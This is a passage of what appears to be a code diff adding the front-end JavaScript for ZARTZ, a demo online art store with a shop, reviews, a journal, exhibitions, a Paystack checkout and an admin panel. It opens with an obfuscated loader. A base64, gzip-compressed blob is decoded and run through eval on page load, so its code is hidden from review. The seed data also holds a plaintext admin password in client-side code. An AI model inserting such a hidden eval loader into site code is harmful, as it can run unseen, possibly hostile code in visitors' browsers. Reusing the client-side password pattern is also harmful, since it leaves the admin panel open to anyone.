yJv/NnIO6vWCxgaNNHddTw2Np6dVlpq+BWfnhAUtYwHs61q1mGTO1AkitRI9d2RH28g7lNyeMXvKdAPfppfE5ollVzemtyg64kMJ5N6K67IvcuUpyDB7ba8MkDYmP8bMh68jgKmbdkOJYQyutaFq9lrKMED+t1ftmLj1J/QmRD+YWD66QQ6OsA/EUZ5dqJq/lEqlYnT9n/9Z4Y31I9ykXa6fPT7krkCTk1KraVaVim2anqmfvBbjFXFzecc9TbHg6obfPOWLxlvAzpQhE7jO6qczaGNbBaHG2uBc2PYVew6nS5yp8Mb9UvIUOzqlwmhRumnpKDi9M/onJ+vLgDFpaPTFmMum3M4CkLtBahlKKRZB/RzAiNOrNfOd01UUiMbhsqtGY9XJpOhFlvEn27Fz0pVNmsHbWe5srdxHFVdArBWZ1cg6ONH+l1spsPKmSU6vN3mm6loWfxxUIK5uWPcH0bc/eFwFnlyTL/vueEQKPKvOpC7RqKXeboWfS56GXLVdyu/jPL492Cbxs0oiF2KO6ofvlptjKfc4zpwdy5HwE6D3mvxJ05OcTRgYJDFZ4RNZ08GDx7wD6WkWJ1SLOoiGzrMd6r4H2DoQ2SAA1Zom1xovQ/Du+iQDgjzPKvmdhBSjw8ckxWUJXwnd4sane6O/mPVH1q/7D7e3Z3FTBWFlfUq4UM/WLhUBR76gpWtwvCUVq0KEyvu46D8pZVK6zDZBoxuAoHdyi8bNYD6CKIJNNVTcvWTwRbW4o+X77mn9PRJQHXiWsFOjvGP71+pH/OhX/kOs/KKdHUBXtOhEoRE328hueTAlVRuqdvydIHmMtyCL2t8GmbqTg4+zV3cCjpp4r/6qdzfM7yE++I4rl7uxmncTzhVq1Z/WsA8hM0QkU/+4/uXfKdLRNggcD/5KGn1AOmDB+ob59VYg6h2c4GVZZmT8xeX9RPxA/18FxrMkU09IP2usPXerIIOvwBmMwZYkn7T1vymCWX5ZONm5dRvyXeKTaXfRCAzrFUL2GuQVqYen8AqDiLvAm8uMv2rrSr65O2CclU5waqHvWvpvHf6QHP96GoxG5tqW2dcbWax+cDrGrNUrnTcrA+/kksvntfv8SVfss6m+tcFBjsYbXBv1aS//y9C252Q6IUAAA==");const a=Uint8Array.from(b,c=>c.charCodeAt(0));const s=await new Response(new Blob([a]).stream().pipeThrough(new DecompressionStream("gzip"))).text();(0,eval)(s)})().catch(e=>console.error("ZARTZ script load failed",e));
+(function(){
+var $=function(s){return document.querySelector(s)};
+var $$=function(s){return [].slice.call(document.querySelectorAll(s))};
+var esc=function(s){return String(s==null?'':s).replace(/[&<>"]/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]})};
+var money=function(n){return 'GH₵'+Number(n||0).toLocaleString('en-GH',{minimumFractionDigits:2,maximumFractionDigits:2})};
+var fmt=function(d){var x=new Date(d);return isNaN(x)?'':x.toLocaleDateString('en-GB',{day:'numeric',month:'short',year:'numeric'})};
+var today=function(){return new Date().toISOString().slice(0,10)};
+var PALS=[['#f3efe6','#2438ff','#ff6a3d','#161616'],['#101828','#f5c542','#e8e8e8','#3a5ba0'],['#e9f1f2','#0c7c8c','#e4572e','#222'],['#fafafa','#111','#d9342b','#7a7a7a'],['#f6efe0','#3b6fd8','#f0a04b','#1b2a41'],['#f0f0f0','#7c4dff','#00c2a8','#111']];
+
+/* ---------- data ---------- */
+function seed(){
+var W=function(id,t,a,m,y,sz,p,k,d,ex){return{id:id,t:t,a:a,m:m,y:y,sz:sz,p:p,k:k,d:d,ex:ex,st:'live',img:'',pal:PALS[id%PALS.length]}};
+return{n:100,me:0,artists:[],cart:[],
+set:{name:'ZARTZ',tag:'Contemporary art, reviews and exhibitions',foot:'A demonstration store. Artists, museums and works are fictional.',pass:'zartz-admin'},
+works:[
+W(1,'Idle Hands','Mira Okonkwo','Painting',2025,'90 × 112 cm',4800,'circles','Oil on linen. Overlapping discs mark the shifts of a factory floor that never fully stops.',1),
+W(2,'Night Shift, Lisbon','Tomás Vidal','Print',2024,'60 × 75 cm',650,'bars','Edition of 60. Screenprint in four layers, inspired by the ceiling lights of a late tram.',1),
+W(3,'Signal and Noise','Aiko Reyes','Painting',2026,'120 × 150 cm',9200,'waves','Acrylic on canvas. Parallel bands bend as if a recording were played back too slowly.',1),
+W(4,'Grid Study No. 7','Lena Hartmann','Drawing',2025,'42 × 52 cm',1300,'grid','Ink and gouache on paper. One of ten studies in which a square is allowed to misbehave.',2),
+W(5,'Slow Tide','Mira Okonkwo','Print',2023,'50 × 62 cm',480,'waves','Edition of 120. Risograph in three inks, printed on recycled cotton paper.',2),
+W(6,'Unpaid Overtime','Tomás Vidal','Drawing',2026,'70 × 90 cm',2100,'bars','Charcoal and pastel. Tall columns lean into one another like workers on a long commute.',2),
+W(7,'Soft Circuit','Aiko Reyes','Sculpture',2025,'38 × 38 × 20 cm',6400,'circles','Hand-dyed felt over a steel frame. A circuit board rendered as something you want to touch.',3),
+W(8,'Checkpoint','Lena Hartmann','Painting',2024,'80 × 100 cm',3900,'grid','Oil on panel. A grid of lit windows in which one has just gone dark.',3)],
+rev:[{w:1,n:'Dana',r:5,t:'Looks flat online and then glows in person. The blue is unreal.'},{w:1,n:'Ibrahim',r:4,t:'Great presence. Arrived well packed and in a lovely frame.'},{w:2,n:'Marta',r:5,t:'Crisp layers, and the yellow really is that bright.'},{w:3,n:'Joel',r:4,t:'Big, calm, a bit unsettling.'},{w:4,n:'Ana',r:5,t:'Quiet and funny, which is rare.'},{w:4,n:'Pete',r:3,t:'Smaller than I imagined, but beautiful.'},{w:5,n:'Zuri',r:5,t:'Warm colours, soft paper. Perfect in our hallway.'},{w:7,n:'Cleo',r:5,t:'Everyone who visits touches it. Hard to resist.'},{w:8,n:'Sam',r:4,t:'Moody and well made.'}],
+fb:[{w:1,n:'Curator Noor',a:'Composition',t:'The left third carries the whole piece. Keep that tension.'},{w:3,n:'Visitor',a:'Colour',t:'The orange edge is doing a lot of work, in a good way.'}],
+posts:[
+{id:1,t:'Why the factory floor keeps showing up in galleries',c:'Noor Haddad',g:'Essay',dt:'2026-09-24',s:'Artists are returning to work, machines and shifts as subjects. Here is what that says about us.',b:'Walk through any fair this year and you will find assembly lines, spreadsheets and circuit boards painted with real tenderness. That is not nostalgia. It is a way of asking who a machine is for.\n\nThe strongest pieces do not condemn or celebrate. They stay with the question, which is why they hold up after the second visit.'},
+{id:2,t:'How I hang a small show in a big room',c:'Elias Brandt',g:'Practice',dt:'2026-09-10',s:'Three habits that stop a handful of works from looking lost on a large wall.',b:'First, group by conversation, not by size. Second, leave more empty wall than you think you need. Third, walk the room slowly with a stranger and watch where their eyes stop. Move whatever they ignored.'},
+{id:3,t:'Studio visit: Mira Okonkwo on slow painting',c:'Noor Haddad',g:'Studio visit',dt:'2026-08-30',s:'A morning with a painter who lets each layer dry for a week.',b:'Okonkwo works on six canvases at once, rotating them so each gets days of rest. She says the pause is the technique. Colour that is allowed to settle looks deeper.'},
+{id:4,t:'A buyer’s guide to editions and prints',c:'Elias Brandt',g:'Guide',dt:'2026-08-12',s:'What edition sizes mean and what to ask before you buy.',b:'Ask for the edition number, the printing method, the paper and the date. Look for a signed certificate and keep it with the work. Frame with archival materials and keep prints out of direct sun.'}],
+exs:[
+{id:1,m:'Harbor Light Museum',c:'Lisbon, Portugal',t:'Quiet Machines',cu:'Noor Haddad',s:'2026-09-05',e:'2026-10-31',ar:'Mira Okonkwo, Tomás Vidal, Aiko Reyes'},
+{id:2,m:'Northgate Contemporary',c:'Manchester, UK',t:'Line, Square, Rule',cu:'Elias Brandt',s:'2026-10-15',e:'2027-01-18',ar:'Lena Hartmann, Tomás Vidal, Mira Okonkwo'},
+{id:3,m:'Salt Works Art Center',c:'Accra, Ghana',t:'Lights Still On',cu:'Ama Boateng',s:'2026-11-06',e:'2027-02-14',ar:'Aiko Reyes, Lena Hartmann'},
+{id:4,m:'Kestrel Museum of Modern Art',c:'Toronto, Canada',t:'The Long Commute',cu:'Elias Brandt',s:'2026-05-02',e:'2026-08-30',ar:'Tomás Vidal'},
+{id:5,m:'Lantern House',c:'Osaka, Japan',t:'Soft Technology',cu:'Noor Haddad',s:'2026-09-20',e:'2026-12-06',ar:'Aiko Reyes, Mira Okonkwo'}],
+slides:[
+{id:1,t:'Quiet Machines',s:'Seven artists on how we live with automation. On view at Harbor Light Museum in Lisbon.',b:'Find the exhibition',l:'#exhibitions',k:'circles',c1:'#f3efe6',c2:'#2438ff',c3:'#ff6a3d'},
+{id:2,t:'Eight new works this week',s:'Paintings, prints, drawings and sculpture from artists we are watching.',b:'Shop artwork',l:'#shop',k:'bars',c1:'#101828',c2:'#f5c542',c3:'#3a5ba0'},
+{id:3,t:'Sell your art on ZARTZ',s:'Create a profile, upload your work and reach collectors worldwide.',b:'Start selling',l:'#sell',k:'waves',c1:'#0c7c8c',c2:'#e4572e',c3:'#f6efe0'},
+{id:4,t:'Read the Curators’ Journal',s:'Essays, studio visits and buying guides from our curators.',b:'Read the journal',l:'#journal',k:'grid',c1:'#fafafa',c2:'#111111',c3:'#d9342b'},
+{id:5,t:'Reviews from real collectors',s:'See how a work looks in a living room before you buy, and tell artists what you think.',b:'Browse reviews',l:'#shop',k:'circles',c1:'#7c4dff',c2:'#00c2a8',c3:'#f0f0f0'},
+{id:6,t:'Find a museum near you',s:'Search exhibitions by city or curator and see the works on show.',b:'Find exhibitions',l:'#exhibitions',k:'grid',c1:'#10151f',c2:'#ffd23f',c3:'#ee6c4d'},
+{id:7,t:'Collect with confidence',s:'Every work is checked by our curators and ships carefully packed.',b:'Shop artwork',l:'#shop',k:'bars',c1:'#efe9e1',c2:'#c0392b',c3:'#1d1d1d'}]};}
+var db=null;try{db=JSON.parse(localStorage.getItem('zartz'))}catch(e){}
+if(!db||!db.works)db=seed();
+function save(){try{localStorage.setItem('zartz',JSON.stringify(db));return true}catch(e){alert('Browser storage is full. Remove some large images and try again.');return false}}
+function nid(){return ++db.n}
+function wk(id){return db.works.filter(function(w){return w.id===id})[0]}
+function live(){return db.works.filter(function(w){return w.st!=='pending'})}
+function revs(id){return db.rev.filter(function(r){return r.w===id})}
+function fbs(id){return db.fb.filter(function(r){return r.w===id})}
+function avg(id){var v=revs(id);return v.length?v.reduce(function(a,b){return a+b.r},0)/v.length:0}
+function stars(n){var k=Math.round(n);return '★★★★★'.slice(0,k)+'☆☆☆☆☆'.slice(0,5-k)}
+function ink(c){var h=String(c).replace('#','');if(h.length===3)h=h.replace(/./g,'$&$&');var n=parseInt(h,16),l=(.299*(n>>16)+.587*(n>>8&255)+.114*(n&255))/255;return l>.6?'#111111':'#ffffff'}
+
+/* ---------- generative art ---------- */
+function rng(a){return function(){a|=0;a=a+0x6D2B79F5|0;var t=Math.imul(a^a>>>15,1|a);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296}}
+function art(w){
+  if(w.img)return '<img src="'+w.img+'" alt="'+esc(w.t+' by '+w.a)+'" style="width:100%;height:100%;object-fit:cover">';
+  var r=rng(w.id*977),p=w.pal||PALS[w.id%PALS.length],i,s='<svg viewBox="0 0 100 125" role="img" aria-label="'+esc(w.t+' by '+w.a)+'"><rect width="100" height="125" fill="'+p[0]+'"/>';
+  if(w.k==='circles')for(i=0;i<9;i++)s+='<circle cx="'+(r()*100)+'" cy="'+(r()*125)+'" r="'+(8+r()*28)+'" fill="'+p[1+i%3]+'" opacity=".85"/>';
+  if(w.k==='bars')for(i=0;i<7;i++){var h=30+r()*80;s+='<rect x="'+(i*14.5+3)+'" y="'+(125-h)+'" width="10" height="'+h+'" fill="'+p[1+i%3]+'"/>'}
+  if(w.k==='waves')for(i=0;i<7;i++){var y=12+i*16,a=6+r()*14;s+='<path d="M-5 '+y+' Q 25 '+(y-a)+' 50 '+y+' T 105 '+y+'" stroke="'+p[1+i%3]+'" stroke-width="6" fill="none"/>'}
+  if(w.k==='grid')for(i=0;i<30;i++)if(r()>.25)s+='<rect x="'+((i%5)*19+4)+'" y="'+(Math.floor(i/5)*19+5)+'" width="16" height="16" fill="'+p[1+Math.floor(r()*3)]+'"/>';
+  return s+'</svg>'}
+
+/* ---------- settings + routing ---------- */
+function apply(){var n=db.set.name;$('#brand').textContent=n;$('#fname').textContent=n;$('#ftxt').textContent=db.set.foot;document.title=n+' – '+db.set.tag}
+function route(){var v=(location.hash||'#shop').slice(1);var el=$('#'+v);if(!el||!el.classList.contains('view'))v='shop';
+  $$('.view').forEach(function(e){e.classList.toggle('on',e.id===v)});
+  $$('[data-v]').forEach(function(a){a.classList.toggle('on',a.dataset.v===v)});
+  if(v==='sell')sell();if(v==='admin')admin();window.scrollTo(0,0)}
+window.addEventListener('hashchange',route);
+
+/* ---------- slider (7 slides, editable in admin) ---------- */
+var si=0,timer=null,paused=false,RM=window.matchMedia&&matchMedia('(prefers-reduced-motion:reduce)').matches;
+function slider(){var S=db.slides;si=Math.min(si,S.length-1);
+  $('#sl').innerHTML=S.map(function(s,i){return '<div class="sl'+(i===si?' on':'')+'" role="group" aria-roledescription="slide" aria-label="'+(i+1)+' of '+S.length+'" style="background:'+esc(s.c1)+';color:'+ink(s.c1)+'"><div class="wrap"><div><h1>'+esc(s.t)+'</h1><p>'+esc(s.s)+'</p><a class="btn" href="'+esc(s.l)+'" style="background:'+esc(s.c2)+';color:'+ink(s.c2)+'">'+esc(s.b)+'</a></div><div class="sa im" style="background:none">'+art({id:200+i,k:s.k,t:s.t,a:'ZARTZ',pal:[s.c1,s.c2,s.c3,ink(s.c1)]})+'</div></div></div>'}).join('');
+  $('#dots').innerHTML=S.map(function(s,i){return '<button data-d="'+i+'" aria-label="Go to slide '+(i+1)+'" aria-current="'+(i===si)+'"></button>'}).join('');
+  $('#slw').style.color=ink(S[si].c1);play()}
+function go(n){var S=db.slides;si=(n+S.length)%S.length;$$('#sl .sl').forEach(function(e,i){e.classList.toggle('on',i===si)});$$('#dots button').forEach(function(b,i){b.setAttribute('aria-current',i===si)});$('#slw').style.color=ink(S[si].c1)}
+function play(){clearInterval(timer);if(!RM&&!paused)timer=setInterval(function(){go(si+1)},6000)}
+$('#prev').onclick=function(){go(si-1);play()};$('#next').onclick=function(){go(si+1);play()};
+$('#dots').onclick=function(e){if(e.target.dataset.d){go(+e.target.dataset.d);play()}};
+$('#pp').onclick=function(){paused=!paused;this.textContent=paused?'Play':'Pause';this.setAttribute('aria-label',paused?'Play slides':'Pause slides');play()};
+$('#slw').onmouseenter=function(){clearInterval(timer)};$('#slw').onmouseleave=play;
+$('#slw').addEventListener('focusin',function(){clearInterval(timer)});$('#slw').addEventListener('focusout',play);
+
+/* ---------- shop ---------- */
+var med='All',exf=0;
+function chips(){var ms=['All'].concat(live().map(function(w){return w.m}).filter(function(m,i,a){return a.indexOf(m)===i}));
+  if(ms.indexOf(med)<0)med='All';
+  $('#chips').innerHTML=ms.map(function(m){return '<button class="chip" aria-pressed="'+(m===med)+'">'+esc(m)+'</button>'}).join('')}
+$('#chips').onclick=function(e){if(!e.target.classList.contains('chip'))return;med=e.target.textContent;chips();grid()};
+$('#q').oninput=grid;$('#sort').onchange=grid;
+function grid(){var q=$('#q').value.toLowerCase(),s=$('#sort').value;
+  var l=live().filter(function(w){return(!exf||w.ex===exf)&&(med==='All'||w.m===med)&&(w.t+' '+w.a).toLowerCase().indexOf(q)>-1});
+  l.sort(function(a,b){return s==='lo'?a.p-b.p:s==='hi'?b.p-a.p:s==='new'?b.id-a.id:avg(b.id)-avg(a.id)});
+  $('#count').innerHTML=l.length+' artwork'+(l.length===1?'':'s')+(exf?' from this exhibition. <a href="#shop" id="clr">Show all</a>':'');
+  $('#grid').innerHTML=l.length?l.map(function(w){var n=revs(w.id).length;
+    return '<button class="art" data-id="'+w.id+'"><div class="im">'+art(w)+'</div><h3>'+esc(w.t)+'</h3><p>'+esc(w.a)+', '+esc(w.y)+'</p><p>'+esc(w.m)+'</p><p><span class="st">'+(n?stars(avg(w.id)):'No reviews yet')+'</span> '+(n?'('+n+')':'')+'</p><p class="pr">'+money(w.p)+'</p></button>'}).join(''):'<p class="mut">No artwork matches. Try a different search.</p>'}
+$('#grid').onclick=function(e){var b=e.target.closest('.art');if(b)openW(+b.dataset.id,'r')};
+$('#count').onclick=function(e){if(e.target.id==='clr'){e.preventDefault();exf=0;grid()}};
+
+/* ---------- artwork dialog: reviews + feedback ---------- */
+var dlg=$('#dlg');
+function openW(id,tab){var w=wk(id);if(!w)return;var ex=db.exs.filter(function(x){return x.id===w.ex})[0],rv=revs(id),fb=fbs(id),h;
+  h='<button class="x" aria-label="Close" data-x>×</button><div class="dg"><div><div class="im">'+art(w)+'</div></div><div>'+
+  '<h2>'+esc(w.t)+'</h2><div>'+esc(w.a)+', '+esc(w.y)+'</div><div class="st" style="margin-top:6px">'+(rv.length?stars(avg(id))+' <span class="mut">'+avg(id).toFixed(1)+' from '+rv.length+'</span>':'<span class="mut">No reviews yet</span>')+'</div>'+
+  '<p>'+esc(w.d)+'</p><dl><dt>Medium</dt><dd>'+esc(w.m)+'</dd><dt>Size</dt><dd>'+esc(w.sz)+'</dd><dt>Shown at</dt><dd>'+(ex?esc(ex.t)+', '+esc(ex.m):'Not in an exhibition')+'</dd></dl>'+
+  '<div style="display:flex;gap:12px;align-items:center"><b style="font-size:24px">'+money(w.p)+'</b><button class="btn dark" data-add="'+id+'">Add to cart</button></div>'+
+  '<div class="tabs" role="tablist"><button role="tab" data-t="r" aria-selected="'+(tab==='r')+'">Reviews ('+rv.length+')</button><button role="tab" data-t="f" aria-selected="'+(tab==='f')+'">Feedback ('+fb.length+')</button></div>';
+  if(tab==='r'){
+    h+=(rv.length?rv.map(function(x){return '<div class="rv"><b>'+esc(x.n)+'</b><span class="st">'+stars(x.r)+'</span><p>'+esc(x.t)+'</p></div>'}).join(''):'<p class="mut">Be the first to review this work.</p>')+
+    '<form id="fr"><div class="row"><input name="n" placeholder="Your name" required maxlength="40" aria-label="Your name"><select name="r" aria-label="Rating"><option value="5">5 stars</option><option value="4">4 stars</option><option value="3">3 stars</option><option value="2">2 stars</option><option value="1">1 star</option></select></div><textarea name="t" placeholder="What did you notice? How does it look in person?" required maxlength="500" aria-label="Review"></textarea><button class="btn" type="submit">Post review</button></form>';
+  }else{
+    h+='<p class="mut">Feedback goes to the artist and curators. Be specific and kind.</p>'+fb.map(function(x){return '<div class="rv"><b>'+esc(x.n)+'</b><span class="tag">'+esc(x.a)+'</span><p>'+esc(x.t)+'</p></div>'}).join('')+
+    '<form id="ff"><div class="row"><input name="n" placeholder="Your name" required maxlength="40" aria-label="Your name"><select name="a" aria-label="Aspect"><option>Composition</option><option>Colour</option><option>Concept</option><option>Technique</option><option>Framing</option></select></div><textarea name="t" placeholder="What worked, and what would you change?" required maxlength="500" aria-label="Feedback"></textarea><button class="btn" type="submit">Send feedback</button></form>';
+  }
+  dlg.innerHTML=h+'</div></div>';dlg.dataset.id=id;if(!dlg.open)dlg.showModal();
+  var f=$('#fr'),g=$('#ff');
+  if(f)f.onsubmit=function(e){e.preventDefault();var d=new FormData(f);db.rev.push({w:id,n:d.get('n'),r:+d.get('r'),t:d.get('t')});save();openW(id,'r');grid()};
+  if(g)g.onsubmit=function(e){e.preventDefault();var d=new FormData(g);db.fb.push({w:id,n:d.get('n'),a:d.get('a'),t:d.get('t')});save();openW(id,'f')};
+}
+dlg.onclick=function(e){var t=e.target;
+  if(t===dlg||t.hasAttribute('data-x'))dlg.close();
+  if(t.dataset.t)openW(+dlg.dataset.id,t.dataset.t);
+  if(t.dataset.add){add(+t.dataset.add);t.textContent='Added'}};
+
+/* ---------- cart ---------- */
+function add(id){if(db.cart.indexOf(id)<0)db.cart.push(id);save();cart()}
+function cart(){db.cart=db.cart.filter(wk);var l=db.cart.map(wk);
+  $('#cnt').textContent=l.length;
+  $('#items').innerHTML=l.length?l.map(function(w){return '<div class="it"><div class="im">'+art(w)+'</div><div><b>'+esc(w.t)+'</b><br><span class="mut">'+esc(w.a)+'</span><br>'+money(w.p)+'</div><button data-rm="'+w.id+'">Remove</button></div>'}).join(''):'<p class="mut">Your cart is empty. Browse the artwork to add a piece.</p>';
+  $('#tot').textContent=money(l.reduce(function(a,w){return a+Number(w.p)},0))}
+$('#cartBtn').onclick=function(){$('#cart').hidden=false;$('#msg').textContent=''};
+$('#cx').onclick=function(){$('#cart').hidden=true};
+$('#items').onclick=function(e){var r=e.target.dataset.rm;if(r){db.cart=db.cart.filter(function(i){return i!==+r});save();cart()}};
+$('#pay').onclick=function(){
+  if(!db.cart.length){$('#msg').textContent='Add an artwork before checking out.';return}
+  $('#payemail').value=localStorage.getItem('zartz_checkout_email')||'';
+  $('#paystatus').textContent='';
+  $('#paydlg').showModal();
+};
+$('#payx').onclick=function(){$('#paydlg').close()};
+$('#payform').onsubmit=async function(e){
+  e.preventDefault();
+  var email=$('#payemail').value.trim();
+  if(!email)return;
+  var items=db.cart.map(wk).filter(Boolean);
+  var amount=items.reduce(function(a,w){return a+Number(w.p||0)},0);
+  var btn=this.querySelector('button[type="submit"]');
+  btn.disabled=true;
+  $('#paystatus').textContent='Preparing secure Paystack checkout…';
+  try{
+    localStorage.setItem('zartz_checkout_email',email);
+    var res=await fetch('/api/paystack/initialize',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        email:email,
+        amount:Math.round(amount*100),
+        currency:'GHS',
+        items:items.map(function(w){return {id:w.id,title:w.t,price:Number(w.p||0),quantity:1}})
+      })
+    });
+    var data=await res.json();
+    if(!res.ok||!data.success)throw new Error(data.message||'Unable to initialize payment.');
+    $('#paydlg').close();
+    var popup=new PaystackPop();
+    popup.resumeTransaction(data.access_code);
+  }catch(err){
+    $('#paystatus').textContent=err.message||'Payment could not be started.';
+  }finally{
+    btn.disabled=false;
+  }
+};
+
+/* ---------- journal ---------- */
+var cur='All';
+function jchips(){var cs=['All'].concat(db.posts.map(function(p){return p.c}).filter(function(c,i,a){return a.indexOf(c)===i}));if(cs.indexOf(cur)<0)cur='All';
+  $('#jchips').innerHTML=cs.map(function(c){return '<button class="chip" aria-pressed="'+(c===cur)+'">'+esc(c)+'</button>'}).join('')}
+$('#jchips').onclick=function(e){if(!e.target.classList.contains('chip'))return;cur=e.target.textContent;jchips();posts()};
+function posts(){var l=db.posts.filter(function(p){return cur==='All'||p.c===cur}).sort(function(a,b){return a.dt<b.dt?1:-1});
+  $('#posts').innerHTML=l.length?l.map(function(p){return '<details><summary><div class="meta">'+esc(p.g)+' · '+fmt(p.dt)+' · by '+esc(p.c)+'</div><h3>'+esc(p.t)+'</h3><p>'+esc(p.s)+'</p></summary><div class="body">'+esc(p.b)+'</div></details>'}).join(''):'<p class="mut">No posts yet.</p>'}
+
+/* ---------- exhibitions ---------- */
+function status(x){var n=new Date();return n<new Date(x.s)?'soon':n>new Date(x.e+'T23:59:59')?'past':'now'}
+function exs(){var q=$('#eq').value.toLowerCase(),s=$('#est').value;
+  var l=db.exs.filter(function(x){return(x.m+x.c+x.cu+x.t).toLowerCase().indexOf(q)>-1&&(!s||status(x)===s)}).sort(function(a,b){return a.s<b.s?-1:1});
+  $('#exs').innerHTML=l.length?l.map(function(x){var st=status(x),n=live().filter(function(w){return w.ex===x.id}).length;
+    return '<article class="ex"><span class="badge '+st+'">'+{now:'On now',soon:'Upcoming',past:'Closed'}[st]+'</span><h3>'+esc(x.t)+'</h3><b>'+esc(x.m)+'</b><span class="mut">'+esc(x.c)+'</span><span>'+fmt(x.s)+' to '+fmt(x.e)+'</span><span class="mut">Curated by '+esc(x.cu)+'. Artists: '+esc(x.ar)+'.</span>'+(n?'<a class="btn" href="#shop" data-ex="'+x.id+'">See '+n+' work'+(n>1?'s':'')+'</a>':'')+'</article>'}).join(''):'<p class="mut">No exhibitions match. Try another city or clear the date filter.</p>'}
+$('#eq').oninput=exs;$('#est').onchange=exs;
+$('#exs').onclick=function(e){var b=e.target.closest('[data-ex]');if(!b)return;exf=+b.dataset.ex;med='All';$('#q').value='';chips();grid()};
+
+/* ---------- forms: generic builder, image resize ---------- */
+function fld(f,v){var n='name="'+f.k+'"',r=f.r?' required':'',val=esc(v),h='<label>'+f.l;
+  if(f.t==='area')h+='<textarea '+n+r+'>'+val+'</textarea>';
+  else if(f.t==='sel'||f.t==='ex'){var o=f.t==='ex'?[['0','None']].concat(db.exs.map(function(x){return[String(x.id),x.t+' ('+x.m+')']})):f.o.map(function(x){return[x,x]});
+    h+='<select '+n+'>'+o.map(function(x){return '<option value="'+esc(x[0])+'"'+(String(v)===x[0]?' selected':'')+'>'+esc(x[1])+'</option>'}).join('')+'</select>'}
+  else if(f.t==='img')h+='<input type="file" accept="image/*" data-img><input type="hidden" '+n+' value="'+val+'">'+(v?'<img class="pv" src="'+esc(v)+'" alt="Current image">':'<span class="mut" style="font-weight:400">Optional. JPG or PNG. Resized automatically.</span>');
+  else h+='<input '+n+' type="'+({num:'number',date:'date',color:'color',email:'email'}[f.t]||'text')+'" value="'+val+'"'+r+(f.t==='num'?' min="0" step="any"':'')+'>';
+  return h+'</label>'}
+function read(form,sch){var d=new FormData(form),o={};sch.forEach(function(f){var v=d.get(f.k);o[f.k]=(f.t==='num'||f.t==='ex')?+v:v});return o}
+document.addEventListener('change',function(e){var t=e.target;if(!t.dataset||!t.dataset.img||!t.files[0])return;
+  var fr=new FileReader();fr.onload=function(){var im=new Image();im.onload=function(){var s=Math.min(1,700/Math.max(im.width,im.height)),c=document.createElement('canvas');c.width=im.width*s;c.height=im.height*s;c.getContext('2d').drawImage(im,0,0,c.width,c.height);
+    var url=c.toDataURL('image/jpeg',.72);t.nextElementSibling.value=url;var p=t.parentNode.querySelector('.pv')||t.parentNode.appendChild(document.createElement('img'));p.className='pv';p.alt='Preview';p.src=url;var sp=t.parentNode.querySelector('span');if(sp)sp.remove()};im.src=fr.result};fr.readAsDataURL(t.files[0])});
+
+/* ---------- sell page (artist signup) ---------- */
+var sellMsg='';
+var ART=[{k:'t',l:'Title',r:1},{k:'m',l:'Medium',t:'sel',o:['Painting','Print','Drawing','Sculpture','Photography','Mixed media']},{k:'y',l:'Year',t:'num',r:1},{k:'sz',l:'Size (for example 60 × 80 cm)',r:1},{k:'p',l:'Your asking price (USD)',t:'num',r:1},{k:'d',l:'Description',t:'area',r:1},{k:'img',l:'Photo of the work',t:'img'}];
+function sell(){var me=db.artists.filter(function(a){return a.id===db.me})[0],h='<h2>Sell your art on '+esc(db.set.name)+'</h2><p class="sub">Join as an artist, list your work and reach collectors who read, review and give feedback.</p><div class="two"><div><h3>How it works</h3><ul class="ul"><li>Create your artist profile.</li><li>Submit each artwork with a photo, size and price.</li><li>Our curators review it, usually within three days.</li><li>Approved works go live in the shop and can join exhibitions.</li><li>You set your price. '+esc(db.set.name)+' takes a 30% commission when a work sells (demo terms).</li></ul>';
+  if(me){var mine=db.works.filter(function(w){return w.by===me.id});
+    h+='<h3>Your submissions</h3>'+(mine.length?mine.map(function(w){return '<div class="row2"><div><b>'+esc(w.t)+'</b><br><span class="mut">'+money(w.p)+'</span></div><span class="pill" style="'+(w.st==='pending'?'':'background:#9be3b4')+'">'+(w.st==='pending'?'In review':'Live')+'</span></div>'}).join(''):'<p class="mut">Nothing submitted yet.</p>')}
+  h+='</div><div>';
+  if(!me)h+='<h3>1. Create your artist profile</h3><form id="sp" class="pf"><label>Full or artist name<input name="name" required maxlength="60"></label><label>Email<input name="email" type="email" required></label><label>Country<input name="country" required></label><label>Website or Instagram<input name="site"></label><label>About your work<textarea name="bio" required maxlength="600"></textarea></label><button class="btn dark" type="submit">Create profile</button></form>';
+  else h+='<div class="note">Signed in as <b>'+esc(me.name)+'</b> ('+esc(me.email)+'). <a href="#sell" id="so">Use a different profile</a></div><h3>2. Submit an artwork</h3>'+(sellMsg?'<div class="note" role="status">'+esc(sellMsg)+'</div>':'')+'<form id="sa" class="af">'+ART.map(function(f){return fld(f,f.k==='y'?2026:f.k==='m'?'Painting':'')}).join('')+'<div><button class="btn dark" type="submit">Submit for review</button></div></form>';
+  $('#sell').innerHTML=h+'</div></div>';
+  var sp=$('#sp'),sa=$('#sa'),so=$('#so');
+  if(sp)sp.onsubmit=function(e){e.preventDefault();var d=new FormData(sp),a={id:nid(),name:d.get('name'),email:d.get('email'),country:d.get('country'),site:d.get('site'),bio:d.get('bio'),dt:today()};db.artists.push(a);db.me=a.id;sellMsg='';save();sell()};
+  if(so)so.onclick=function(e){e.preventDefault();db.me=0;save();sell()};
+  if(sa)sa.onsubmit=function(e){e.preventDefault();var o=read(sa,ART);o.id=nid();o.a=me.name;o.k=['circles','bars','waves','grid'][o.id%4];o.pal=PALS[o.id%PALS.length];o.ex=0;o.st='pending';o.by=me.id;db.works.push(o);if(save()){sellMsg='Thanks. “'+o.t+'” is in review. We will publish it once a curator has approved it.'}else db.works.pop();sell();refresh(true)};
+}
+
+/* ---------- admin panel ---------- */
+var SW=[{k:'t',l:'Title',r:1},{k:'a',l:'Artist',r:1},{k:'m',l:'Medium',t:'sel',o:['Painting','Print','Drawing','Sculpture','Photography','Mixed media']},{k:'y',l:'Year',t:'num',d:2026},{k:'sz',l:'Size'},{k:'p',l:'Price (USD)',t:'num',r:1},{k:'d',l:'Description',t:'area'},{k:'img',l:'Image',t:'img'},{k:'k',l:'Generated style (when no image)',t:'sel',o:['circles','bars','waves','grid']},{k:'ex',l:'Exhibition',t:'ex'},{k:'st',l:'Status',t:'sel',o:['live','pending']}];
+var SP=[{k:'t',l:'Title',r:1},{k:'c',l:'Curator',r:1},{k:'g',l:'Category',t:'sel',o:['Essay','Practice','Studio visit','Guide','News']},{k:'dt',l:'Date',t:'date'},{k:'s',l:'Summary',t:'area',r:1},{k:'b',l:'Post body',t:'area',r:1}];
